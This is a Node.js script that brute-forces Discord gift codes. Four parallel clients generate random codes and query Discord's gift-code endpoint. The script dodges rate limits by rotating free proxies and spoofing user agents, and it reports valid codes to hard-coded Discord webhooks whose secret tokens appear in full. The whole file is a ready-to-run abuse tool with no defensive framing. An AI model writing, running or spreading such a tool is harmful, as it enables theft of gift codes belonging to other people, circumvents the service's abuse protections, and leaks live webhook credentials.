const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1421773638742315041/G4mvH_w0LAw56BKV4l7uFAo7vDnTAlDxg8bbJ99krs_cF3RKSj2-EAFaphDS5tVmz5Rz';
const FAILING_WEBHOOK_URL = 'https://discord.com/api/webhooks/1421784784085975081/JuDT2H61q61UnwXwLc8gSeAYI631JiS0TNdLUSw7YhJwxq1gzTdVk6bYy-J1zPwE6Rlb';


class GeoNodeProxyManager {
    constructor() {
        this.proxies = [];
        this.currentIndex = 0;
        this.failedProxies = new Set();
        this.lastFetched = 0;
        this.fetchInterval = 300000;
    }

    async fetchHighSpeedProxies() {
        try {
            console.log('🔄 Fetching fresh high-speed proxies from GeoNode API...');

            const response = await axios.get('https://proxylist.geonode.com/api/proxy-list', {
                params: {
                    limit: 500,
                    page: 1,
                    sort_by: 'lastChecked',
                    sort_type: 'desc'
                },
                timeout: 10000,
                maxRedirects: 5
            });

            const proxyData = response.data;

            const highSpeedProxies = proxyData.data.filter(proxy =>
                proxy.protocols.includes('http') &&
                proxy.speed > 15000 &&
                proxy.latency < 150 &&
                proxy.responseTime < 6000
            );

            highSpeedProxies.sort((a, b) => {
                const uptimeDiff = b.upTime - a.upTime;
                if (uptimeDiff !== 0) return uptimeDiff;
                return b.speed - a.speed;
            });

            this.proxies = highSpeedProxies.map(proxy => ({
                url: `http://${proxy.ip}:${proxy.port}`,
                ip: proxy.ip,
                port: proxy.port,
                speed: proxy.speed,
                upTime: proxy.upTime,
                latency: proxy.latency,
                country: proxy.country,
                responseTime: proxy.responseTime
            }));

            this.lastFetched = Date.now();
            this.failedProxies.clear();

            console.log(`✅ Loaded ${this.proxies.length} high-quality proxies`);
            if (this.proxies.length > 0) {
                const avgUptime = this.proxies.reduce((sum, p) => sum + p.upTime, 0) / this.proxies.length;
                console.log(`📊 Average uptime: ${avgUptime.toFixed(1)}%`);
            }

            return this.proxies.length;

        } catch (error) {
            console.error('❌ Failed to fetch proxies from GeoNode:', error.message);
            return 0;
        }
    }

    async getNextProxy(clientId = 0) {
        if (Date.now() - this.lastFetched > this.fetchInterval || this.proxies.length === 0) {
            await this.fetchHighSpeedProxies();
        }

        // Different starting points for different clients
        const startIndex = (this.currentIndex + clientId * 50) % this.proxies.length;
        let attempts = 0;

        while (attempts < this.proxies.length) {
            const index = (startIndex + attempts) % this.proxies.length;
            const proxy = this.proxies[index];
            this.currentIndex = (this.currentIndex + 1) % this.proxies.length;

            if (!this.failedProxies.has(proxy.url)) {
                return proxy;
            }
            attempts++;
        }

        console.log('⚠️  All proxies failed, fetching fresh ones...');
        await this.fetchHighSpeedProxies();

        return this.proxies.length > 0 ? this.proxies[0] : null;
    }

    markProxyAsFailed(proxyUrl) {
        this.failedProxies.add(proxyUrl);

        if (this.failedProxies.size > this.proxies.length * 0.6) {
            console.log('🔄 Too many failed proxies, will refresh on next request');
            this.lastFetched = 0;
        }
    }

    getStats() {
        return {
            total: this.proxies.length,
            failed: this.failedProxies.size,
            working: this.proxies.length - this.failedProxies.size,
            lastUpdated: new Date(this.lastFetched).toLocaleString()
        };
    }
}

class TurboGiftCodeScanner {
    constructor(webhookUrl, clientId = 1) {
        this.webhookUrl = webhookUrl;
        this.clientId = clientId;
        this.proxyManager = new GeoNodeProxyManager();
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ];
        this.stats = {
            attempts: 0,
            validCodes: 0,
            rateLimited: 0,
            errors: 0,
            proxyErrors: 0,
            startTime: Date.now()
        };
    }

    generateRandomCode(length = 18) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    getRandomUserAgent() {
        return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    }

    async checkGiftCodeWithProxy(code) {
        const proxy = await this.proxyManager.getNextProxy(this.clientId);

        if (!proxy) {
            throw new Error('No working proxies available');
        }

        const userAgent = this.getRandomUserAgent();

        try {
            const config = {
                timeout: 8000, // Faster timeout for speed
                maxRedirects: 0,
                validateStatus: function (status) {
                    return status >= 200 && status < 600;
                },
                headers: {
                    'Accept': 'application/json',
                    'User-Agent': userAgent,
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Connection': 'close',
                    'DNT': '1'
                }
            };

            const agent = new HttpsProxyAgent(proxy.url, {
                timeout: 6000,
                keepAlive: false
            });

            config.httpsAgent = agent;

            const response = await axios.get(
                `https://discord.com/api/v8/entitlements/gift-codes/${code}`,
                config
            );

            const data = {
                content: `# New Failed Code 
> discord.gift/${code}`
            };

            axios.post(FAILING_WEBHOOK_URL, data)

            return {
                valid: response.status === 200,
                status: response.status,
                data: response.status === 200 ? response.data : null,
                proxy: proxy,
                success: true
            };

        } catch (error) {
            const errorMessage = error.message.toLowerCase();

            if (error.code === 'ECONNREFUSED' ||
                error.code === 'ETIMEDOUT' ||
                error.code === 'ENOTFOUND' ||
                error.code === 'ECONNRESET' ||
                errorMessage.includes('tunnel') ||
                errorMessage.includes('socket hang up') ||
                errorMessage.includes('maximum number of redirects') ||
                errorMessage.includes('proxy') ||
                errorMessage.includes('connect timeout')) {

                this.proxyManager.markProxyAsFailed(proxy.url);
                this.stats.proxyErrors++;

                return {
                    valid: false,
                    status: null,
                    error: `Proxy error: ${error.message.substring(0, 30)}`,
                    proxy: proxy,
                    success: false,
                    isProxyError: true
                };
            }

            if (error.response) {
                return {
                    valid: false,
                    status: error.response.status,
                    data: null,
                    proxy: proxy,
                    success: true,
                    error: `HTTP ${error.response.status}`
                };
            }

            return {
                valid: false,
                status: null,
                error: error.message,
                proxy: proxy,
                success: false
            };
        }
    }

    async sendToWebhook(code, giftData, proxy) {
        const embed = {
            title: '🎉 JACKPOT! VALID DISCORD GIFT CODE!',
            description: `**🎁 Code:** \`${code}\`\n**✅ Status:** Valid (200)\n**⏰ Time:** ${new Date().toLocaleString()}\n**🤖 Client:** #${this.clientId}`,
            color: 0x57F287,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: '🌍 Proxy Used',
                    value: `**IP:** ${proxy.ip}:${proxy.port}\n**Country:** ${proxy.country}\n**Speed:** ${proxy.speed}\n**Uptime:** ${proxy.upTime}%`,
                    inline: true
                },
                {
                    name: '📊 Client Stats',
                    value: `**Attempts:** ${this.stats.attempts}\n**Found:** ${this.stats.validCodes}\n**Runtime:** ${this.getUptime()}`,
                    inline: true
                }
            ],
            thumbnail: {
                url: 'https://cdn.discordapp.com/emojis/742028971997405244.gif'
            },
            footer: {
                text: `Turbo Scanner Client ${this.clientId} • Powered by GeoNode`
            }
        };

        if (giftData) {
            embed.fields.push({
                name: '🎯 Gift Details',
                value: `\`\`\`json\n${JSON.stringify(giftData, null, 2).substring(0, 600)}\n\`\`\``,
                inline: false
            });
        }

        const payload = {
            username: `🎁 Gift Hunter Client ${this.clientId}`,
            avatar_url: 'https://cdn.discordapp.com/emojis/742028971997405244.png',
            content: `🚨 **ALERT: VALID CODE FOUND BY CLIENT ${this.clientId}!** 🚨\n@everyone`,
            embeds: [embed]
        };

        try {
            await axios.post(this.webhookUrl, payload, { timeout: 8000 });
            console.log(`✅ [CLIENT ${this.clientId}] Alert sent for code: ${code}`);
        } catch (error) {
            console.error(`❌ [CLIENT ${this.clientId}] Webhook failed:`, error.message);
        }
    }

    getUptime() {
        const uptime = Date.now() - this.stats.startTime;
        const hours = Math.floor(uptime / 3600000);
        const minutes = Math.floor((uptime % 3600000) / 60000);
        const seconds = Math.floor((uptime % 60000) / 1000);
        return `${hours}h ${minutes}m ${seconds}s`;
    }

    displayStats() {
        const proxyStats = this.proxyManager.getStats();
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        const rate = this.stats.attempts / elapsed;

        console.log(`\n📈 ═══ CLIENT ${this.clientId} STATISTICS ═══`);
        console.log(`🎯 Attempts: ${this.stats.attempts} | ✅ Found: ${this.stats.validCodes}`);
        console.log(`⚡ Rate: ${rate.toFixed(2)} req/sec | 🕒 Runtime: ${this.getUptime()}`);
        console.log(`🌐 Proxies: ${proxyStats.working}/${proxyStats.total} working`);
    }

    async startTurboScanning() {
        console.log(`🚀 [CLIENT ${this.clientId}] Starting Turbo Gift Code Scanner`);
        console.log(`🌐 Webhook: https://discord.com/api/webhooks/1421773638742315041/...`);
        console.log('⚡ TURBO MODE: Optimized for maximum speed!');
        console.log('═══════════════════════════════════════════');

        await this.proxyManager.fetchHighSpeedProxies();

        if (this.proxyManager.proxies.length === 0) {
            console.error(`❌ [CLIENT ${this.clientId}] No proxies available. Exiting...`);
            return;
        }

        // Parallel processing for even faster scanning
        const concurrentRequests = 3; // 3 simultaneous requests per client

        while (true) {
            const promises = [];

            for (let i = 0; i < concurrentRequests; i++) {
                promises.push(this.processCode());
            }

            await Promise.allSettled(promises);

            // Display stats every 30 attempts
            if (this.stats.attempts % 30 === 0) {
                this.displayStats();
            }

            // Short delay between batches
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }

    async processCode() {
        this.stats.attempts++;
        const code = this.generateRandomCode();

        console.log(`🔍 [CLIENT ${this.clientId}] #${this.stats.attempts}: ${code}`);

        try {
            const result = await this.checkGiftCodeWithProxy(code);

            if (result.success) {
                if (result.valid) {
                    this.stats.validCodes++;
                    console.log(`🎉 [CLIENT ${this.clientId}] *** JACKPOT! *** ${code}`);
                    console.log(`🌍 [CLIENT ${this.clientId}] Via: ${result.proxy.ip} (${result.proxy.country})`);
                    await this.sendToWebhook(code, result.data, result.proxy);

                    // Celebration delay
                    await new Promise(resolve => setTimeout(resolve, 3000));

                } else if (result.status === 404) {
                    // Silent for speed
                } else if (result.status === 429) {
                    this.stats.rateLimited++;
                    console.log(`⏳ [CLIENT ${this.clientId}] Rate limited - switching...`);
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } else if (result.status === 403) {
                    console.log(`🚫 [CLIENT ${this.clientId}] Forbidden (403)`);
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            } else {
                if (result.isProxyError) {
                    // Silent proxy rotation for speed
                    await new Promise(resolve => setTimeout(resolve, 200));
                } else {
                    this.stats.errors++;
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }

        } catch (error) {
            this.stats.errors++;
            console.error(`💥 [CLIENT ${this.clientId}] Error: ${error.message.substring(0, 40)}`);
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
    }
}

// MULTI-CLIENT SETUP

// Create multiple scanner instances
const scanner1 = new TurboGiftCodeScanner(WEBHOOK_URL, 1);
const scanner2 = new TurboGiftCodeScanner(WEBHOOK_URL, 2);
const scanner3 = new TurboGiftCodeScanner(WEBHOOK_URL, 3);
const scanner4 = new TurboGiftCodeScanner(WEBHOOK_URL, 4);

// Function to start multiple clients
async function startMultiClientScanning() {
    console.log('🚀 LAUNCHING MULTI-CLIENT TURBO GIFT CODE SCANNER');
    console.log('⚡ Running 4 clients simultaneously for maximum speed!');
    console.log('🎯 Target: Discord Gift Codes');
    console.log('🌐 Proxy Source: GeoNode High-Speed Pool');
    console.log('═══════════════════════════════════════════════════════');

    // Start both clients simultaneously
    Promise.all([
        scanner1.startTurboScanning(),
        scanner2.startTurboScanning(),
        scanner3.startTurboScanning(),
        scanner4.startTurboScanning()
    ]).catch(console.error);

    // Combined stats display every 30 seconds
    setInterval(() => {
        const totalAttempts = scanner1.stats.attempts + scanner2.stats.attempts + scanner3.stats.attempts + scanner4.stats.attempts;
        const totalValid = scanner1.stats.validCodes + scanner2.stats.validCodes + scanner3.stats.validCodes + scanner4.stats.validCodes;
        const totalTime = Math.max(
            Date.now() - scanner1.stats.startTime,
            Date.now() - scanner2.stats.startTime,
            Date.now() - scanner3.stats.startTime,
            Date.now() - scanner4.stats.startTime
        ) / 1000;
        const combinedRate = totalAttempts / totalTime;

        console.log('\n🔥 ═══════════ COMBINED STATS ═══════════');
        console.log(`🎯 Total Attempts: ${totalAttempts}`);
        console.log(`✅ Valid Codes Found: ${totalValid}`);
        console.log(`⚡ Combined Rate: ${combinedRate.toFixed(2)} req/sec`);
        console.log(`🕒 Total Runtime: ${Math.floor(totalTime / 3600)}h ${Math.floor((totalTime % 3600) / 60)}m`);
        console.log('════════════════════════════════════════\n');
    }, 30000);
}

// START THE TURBO SCANNERS
startMultiClientScanning();

// Export for manual control
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { TurboGiftCodeScanner, GeoNodeProxyManager };
}
